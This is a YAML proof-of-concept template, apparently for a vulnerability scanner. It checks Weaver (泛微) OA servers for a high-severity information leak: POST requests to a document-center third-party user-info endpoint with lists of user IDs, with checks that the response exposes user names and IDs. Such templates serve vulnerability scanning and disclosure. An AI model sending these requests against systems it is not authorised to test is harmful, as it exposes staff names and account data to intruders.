id: poc-yaml-weaver-oa-3rduserinfo-username-leak
info:
  name: 泛微OA 用户 3rduserinfo name 信息泄露漏洞
  severity: high
  tags:
  - 信息泄露
  finger: weaver
requests:
- method: POST
  path: /api/wps/doccenter/outter/v1/3rd/user/info
  headers:
    Content-Type: application/json
  data: '{

    "ids":[

    1,22,4,5,6,7,8]

    }'
  expression: status_code == 200 &&  contains(body, "\"name\":") && contains(body,
    "\"id\":") && !contains(body, "<")
- method: POST
  path: /api/wps/doccenter/outter/v1/3rd/user/info
  headers:
    Content-Type: application/json
  data: '{

    "ids":[]

    }'
  expression: 'status_code == 200 &&  !contains(body, "\"name\":") && !contains(body,
    "\"id\":") && !contains(body, "<")

    '
variables: {}
transport: http
